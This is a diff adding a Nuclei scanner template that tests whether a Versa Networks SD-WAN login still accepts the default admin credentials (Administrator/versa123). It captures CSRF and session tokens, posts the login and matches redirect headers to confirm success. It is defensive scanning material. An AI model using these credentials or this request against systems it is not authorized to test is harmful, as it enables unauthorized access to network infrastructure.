@@ -1,0 +1,59 @@
+id: versa-sdwan-default-login-new
+
+info:
+  name: Versa Networks SD-WAN Application Default Login
+  author: davidmckennirey
+  severity: high
+  description: |
+    Searches for default admin credentials for the Versa Networks SD-WAN application.
+  tags: default-login,versa,sdwan
+
+requests:
+  - raw:
+      - |
+        GET /versa/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 52
+        Accept-Encoding: gzip, deflate
+
+      - |
+        POST /versa/j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 52
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: VD-CSRF-TOKEN={{csrf-token}}; JSESSIONID={{session}}
+        Accept-Encoding: gzip, deflate
+
+        _csrf={{csrf-token}}&j_username=Administrator&j_password=versa123&submit=
+
+    extractors:
+      - type: kval
+        part: header
+        name: csrf-token
+        internal: true
+        kval:
+          - vd-csrf-token
+
+      - type: kval
+        part: header
+        name: session
+        internal: true
+        kval:
+          - jsessionid
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 302'
+          - "contains(tolower(all_headers_2), 'jsessionid')"
+          - "contains(tolower(all_headers_2), 'vd-csrf-token')"
+          - "contains(tolower(all_headers_2), 'location: /versa/')"
+        condition: and
+
+      - type: dsl
+        dsl:
+          - "contains(tolower(all_headers_2), '/login?error=true')"
+          - "contains(tolower(all_headers_2), '/login?tokenmissingerror=true')"
+        negative: true
